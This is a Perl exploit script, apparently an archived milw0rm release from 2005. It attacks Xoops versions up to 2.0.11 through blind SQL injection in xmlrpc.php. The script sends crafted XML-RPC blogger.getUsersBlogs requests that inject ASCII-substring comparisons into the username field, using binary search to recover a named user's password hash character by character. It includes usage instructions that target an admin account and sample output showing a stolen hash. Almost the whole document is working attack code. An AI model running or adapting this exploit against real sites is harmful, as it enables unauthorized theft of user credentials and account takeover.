#!/usr/bin/perl

## Xoops <= 2.0.11 xmlrpc.php sql injection exploit by RST/GHC
## based on http://www.gulftech.org/?node=research&article_id=00086-06292005
## coded by 1dt.w0lf
## RST/GHC
## http://rst.void.ru 
## http://ghc.ru

## example:
## r57xoops.pl -u http://www.xoops2.ru/xmlrpc.php -n Alexxus
## ---------------------------------------------------------------
##   Xoops <= 2.0.11 xmlrpc.php sql injection exploit by RST/GHC
## ---------------------------------------------------------------
## [~]  URL : http://www.xoops2.ru/xmlrpc.php
## [~] NAME : Alexxus
## [~] SEARCHING PASSWORD ... [ DONE ]
## ---------------------------------------------------------------
##  USER NAME : Alexxus
##  USER HASH : a26c7baaa40ab863f9b22c8649427fa6
## ---------------------------------------------------------------

use LWP::UserAgent;
use Getopt::Std;

getopts('u:n:');

$url  = $opt_u;
$name = $opt_n;

if(!$url || !$name) { &usage; }

$s_num = 1;
$|++;
$n = 0;
&head;
print "\r\n";
print " [~]  URL : $url\r\n";
print " [~] NAME : $name\r\n";
print " [~] SEARCHING PASSWORD ... [|]";

while(1)
{
if(&found(47,58)==0) { &found(96,103); } 
$char = $i;
if ($char=="0") 
 { 
 if(length($allchar) > 0){
 print qq{\b\b DONE ] 
 ---------------------------------------------------------------
  USER NAME : $name
  USER HASH : $allchar
 ---------------------------------------------------------------
 };
 }
 else
 {
 print "\b\b FAILED ]";
 }
 exit();  
 }
else 
 {  
 $allchar .= chr($char); 
 }
$s_num++;
}

sub found($$)
 {
 my $fmin = $_[0];
 my $fmax = $_[1];
 if (($fmax-$fmin)<5) { $i=crack($fmin,$fmax); return $i; }
 
 $r = int($fmax - ($fmax-$fmin)/2);
 $check = "/**/BETWEEN/**/$r/**/AND/**/$fmax";
 if ( &check($check) ) { &found($r,$fmax); }
 else { &found($fmin,$r); }
 }
 
sub crack($$)
 {
 my $cmin = $_[0];
 my $cmax = $_[1];
 $i = $cmin;
 while ($i<$cmax)
  {
  $crcheck = "=$i";
  if ( &check($crcheck) ) { return $i; }
  $i++;
  }
 $i = 0;
 return $i;
 }
 
sub check($)
 {
 $n++;
 status();
 $ccheck = $_[0]; 

 $data  = '<?xml version="1.0"?>';
 $data .= '<methodCall>';
 $data .= '<methodName>blogger.getUsersBlogs</methodName>';
 $data .= '<params>';
 $data .= '<param>';
 $data .= '<value><string></string></value>';
 $data .= '</param>';
 $data .= '<param>';
 $data .= '<value><string>'.$name.'\' AND ascii(substring(pass,'.$s_num.',1))'.$ccheck.')/*</string></value>';
 $data .= '</param>';
 $data .= '</params>';
 $data .= '</methodCall>';

 $req = new HTTP::Request 'POST' => $url;
 $req->content_type('application/xml');
 $req->content($data);
 $ua = new LWP::UserAgent;
 $res = $ua->request($req);
 $reply= $res->content;
 if($reply =~ /Selected blog application does not exist/) { print "\n [-] NEWS BLOG DOES NOT EXIST =(\n [-] EXPLOIT FAILED!\n"; exit(); }
 if($reply =~ /User authentication failed/) { return 0; }
 else { return 1; }
 }
 
sub status()
{
  $status = $n % 5;
  if($status==0){ print "\b\b/]";  }
  if($status==1){ print "\b\b-]";  }
  if($status==2){ print "\b\b\\]"; }
  if($status==3){ print "\b\b|]";  }
}

sub usage()
 {
 &head;
 print q(
  USAGE:
  r57xoops.pl [OPTIONS]
  
  OPTIONS:
  -u [URL]      - path to xmlrpc.php
  -n [USERNAME] - user for bruteforce
  
  E.G.
  r57xoops.pl -u http://server/xoops/xmlrpc.php -n admin
 ---------------------------------------------------------------
 (c)oded by 1dt.w0lf
 RST/GHC , http://rst.void.ru , http://ghc.ru
 );
 exit();
 }
sub head()
 {
 print q(
 ---------------------------------------------------------------
   Xoops <= 2.0.11 xmlrpc.php sql injection exploit by RST/GHC
 ---------------------------------------------------------------
 );
 }

# milw0rm.com [2005-07-04]
